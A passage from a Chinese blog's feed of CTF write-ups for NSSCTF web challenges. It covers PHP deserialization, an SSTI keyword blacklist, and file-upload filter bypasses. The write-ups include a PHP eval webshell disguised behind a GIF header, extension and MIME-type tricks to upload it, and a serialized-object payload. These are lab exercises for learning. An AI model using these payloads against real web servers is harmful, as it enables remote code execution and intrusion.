property\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token property\">http</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//node5.anna.nssctf.cn:28533/</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token property\">Cache-Control</span><span class=\"token punctuation\">:</span> max-age=0</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token property\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> 1</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token property\">User-Agent</span><span class=\"token punctuation\">:</span> Mozilla/5.0 <span class=\"token punctuation\">(</span>Windows NT 10.0<span class=\"token punctuation\">;</span> Win64<span class=\"token punctuation\">;</span> x64<span class=\"token punctuation\">)</span> AppleWebKit/537.36 <span class=\"token punctuation\">(</span>KHTML<span class=\"token punctuation\">,</span> like Gecko<span class=\"token punctuation\">)</span> Chrome/120.0.0.0 Safari/537.36</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token property\">Accept-Encoding</span><span class=\"token punctuation\">:</span> gzip<span class=\"token punctuation\">,</span> deflate</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token property\">Content-Type</span><span class=\"token punctuation\">:</span> multipart/form-data<span class=\"token punctuation\">;</span> boundary=----WebKitFormBoundary9bDlwasnqKWclnZA</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token property\">Content-Length</span><span class=\"token punctuation\">:</span> 316</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>------WebKitFormBoundary9bDlwasnqKWclnZA</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token property\">Content-Disposition</span><span class=\"token punctuation\">:</span> form-data<span class=\"token punctuation\">;</span> name=<span class=\"token string\">\"file\"</span><span class=\"token punctuation\">;</span> filename=<span class=\"token string\">\"f1ag.php\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token property\">Content-Type</span><span class=\"token punctuation\">:</span> image/jpeg</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>GIF89a</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>&lt;?php <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span>[<span class=\"token string\">'cmd'</span>]<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>?></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>------WebKitFormBoundary9bDlwasnqKWclnZA</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token property\">Content-Disposition</span><span class=\"token punctuation\">:</span> form-data<span class=\"token punctuation\">;</span> name=<span class=\"token string\">\"submit\"</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>提交</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>------WebKitFormBoundary9bDlwasnqKWclnZA--</pre></td></tr></table></figure><h3 id=\"nctf-2018flask真香\"><a class=\"anchor\" href=\"#nctf-2018flask真香\">#</a> [NCTF 2018] flask 真香</h3>\n<h4 id=\"jinja2flask\"><a class=\"anchor\" href=\"#jinja2flask\">#</a> Jinja2,flask</h4>\n<p>fuzz 一波</p>\n<p>禁用了这些</p>\n<pre><code>class\ngetattr\nbuiltins\nimport\nos\npopen\n</code></pre>\n<p>拼接绕过即可。</p>\n<p><img data-src=\"../../../images/NSS/11.png\" alt=\"11\" /></p>\n",
            "tags": [
                "CTF",
                "无敌的Web",
                "我就是歪脖",
                "又坐牢了",
                "懂不懂python的含金量啊",
                "反序列化好难"
            ]
        },
        {
            "id": "https://p1kap1.github.io/CTF/web/NSS%E9%A2%98%E8%AE%B0-web%E7%AF%87/",
            "url": "https://p1kap1.github.io/CTF/web/NSS%E9%A2%98%E8%AE%B0-web%E7%AF%87/",
            "title": "NSS题记-web篇(1)",
            "date_published": "2023-08-25T16:00:00.000Z",
            "content_html": "<h2 id=\"202397\"><a class=\"anchor\" href=\"#202397\">#</a> 2023/9/7</h2>\n<h3 id=\"swpuctf-2021-新生赛ez_unserialize\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛ez_unserialize\">#</a> [SWPUCTF 2021 新生赛] ez_unserialize</h3>\n<h4 id=\"php反序列化文件泄露\"><a class=\"anchor\" href=\"#php反序列化文件泄露\">#</a> php，反序列化，文件泄露</h4>\n<p>打开后是一张胡桃动图。</p>\n<p>打开源码后发现一句注释：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>User<span class=\"token operator\">-</span>agent<span class=\"token punctuation\">:</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Disallow<span class=\"token punctuation\">:</span> 什么东西呢？</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">--</span><span class=\"token operator\">></span></pre></td></tr></table></figure><p>很熟悉的配方，于是查看 robots.txt 文件：</p>\n<figure class=\"highlight txt\"><figcaption data-lang=\"txt\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>User-agent: *</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Disallow: /cl45s.php</pre></td></tr></table></figure><p>查看 cl45s.php 文件：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cl45s.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">wllm</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$admin</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$passwd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">admin</span> <span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"123456\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">admin</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"admin\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"ctf\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">admin</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Just a bit more!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'p'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>审计代码，发现函数在销毁时，如果 admin 等于 &quot;admin&quot;，password 等于 &quot;ctf&quot;，那么就可以输出 flag，于是构建参数：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">wllm</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$admin</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$passwd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">admin</span> <span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"123456\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">admin</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"admin\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"ctf\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">admin</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Just a bit more!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">wllm</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token variable\">$p</span><span class=\"token operator\">-></span><span class=\"token property\">admin</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token variable\">$p</span><span class=\"token operator\">-></span><span class=\"token property\">passwd</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ctf\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>输入：</p>\n<blockquote s:5:admin;s:5:admin;s:6:passwd;s:3:ctf;=\"\">\n<p>?p=O:4:&quot;wllm&quot;:2:</p>\n</blockquote>\n<p>得到 flag。</p>\n<h3 id=\"swpuctf-2021-新生赛easyupload20\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛easyupload20\">#</a> [SWPUCTF 2021 新生赛] easyupload2.0</h3>\n<h4 id=\"远程执行php的多种格式\"><a class=\"anchor\" href=\"#远程执行php的多种格式\">#</a> 远程执行，php 的多种格式</h4>\n<p>打开题目后发现要上传文件，于是上传一句话木马，发现不能上传，于是换了个格式 ——&quot;.phtml&quot;，上传成功，使用蚁剑连接。</p>\n<p>获得 flag。</p>\n<p>复盘</p>\n<p>分析下源码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>//index.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&lt;meta charset=\\\"utf-8\\\"></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>&lt;title>下手轻点，求求了&lt;/title></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>&lt;a>&lt;img src=\\\"https://gitee.com/a-sprite-of-84/docker-upload1/raw/master/images/upload1.jpg\\\" alt=\\\"upload1.jpg\\\" border=\\\"0\\\" />&lt;/a></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>&lt;form action=\\\"upload.php\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\"></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>&lt;input type=\\\"file\\\" name=\\\"uploaded\\\" /></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>&lt;br/></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>&lt;input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"感觉要被秒了\\\" /></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>&lt;/form>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>//upload.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&lt;meta charset=\\\"utf-8\\\">\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token variable\">$target_path</span>  <span class=\"token operator\">=</span>  <span class=\"token string double-quoted-string\">\"./upload\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token variable\">$t_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$target_path</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"/\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token variable\">$uploaded_name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$uploaded_ext</span>  <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_name</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_name</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$uploaded_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'size'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$uploaded_tmp</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/php|hta|ini/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$uploaded_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php是不行滴\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_tmp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_tmp</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$t_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$t_path</span><span class=\"token punctuation\">&#125;</span></span> succesfully uploaded!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"不传🐎还想要f1ag?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>发现用正则表达式过滤了.php/.hta/.ini，因而除了 php 以外的 php 文件都可以上传；</p>\n<p>另</p>\n<p>php3，php5，pht，phtml，phps 都是 php 可运行的文件扩展名</p>\n<h3 id=\"swpuctf-2021-新生赛easyupload10\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛easyupload10\">#</a> [SWPUCTF 2021 新生赛] easyupload1.0</h3>\n<h4 id=\"mime绕过文件上传php文件头绕过\"><a class=\"anchor\" href=\"#mime绕过文件上传php文件头绕过\">#</a> mime 绕过，文件上传，php，文件头绕过</h4>\n<p>打开后是一个要求上传图片的界面，直接上传一句话木马，发现.php 文件被过滤了。</p>\n<p>于是经过一番尝试后发现是 mine 检测。</p>\n<blockquote>\n<p>MIME: 客户端软件，区分不同种类的数据，例如 web 浏览器就是通过 MIME 类型来判断文件是 GIF 图片还是 PostScript 文件。web 浏览器使用 MIME 来说明发送数据的种类，web 服务端使用 MIME 来说明希望接收到的数据种类。</p>\n</blockquote>\n<blockquote>\n<p>MIME 检测原理：服务端 MIME 类型检测是通过检查 http 包的 Content-Type 字段中的值来判断文件上传是否合法的。</p>\n</blockquote>\n<p>本题服务端只接受图片类型，因此可以用 burpsuit 抓包来修改文件类型，将其修改为</p>\n<blockquote>\n<p>Content-Type:image/jpeg</p>\n</blockquote>\n<p>文件成功上传后，用蚁剑进行连接。</p>\n<p>连接成功后查看其中的文件，并未找到 flag 文件，可以回到网页，用 post 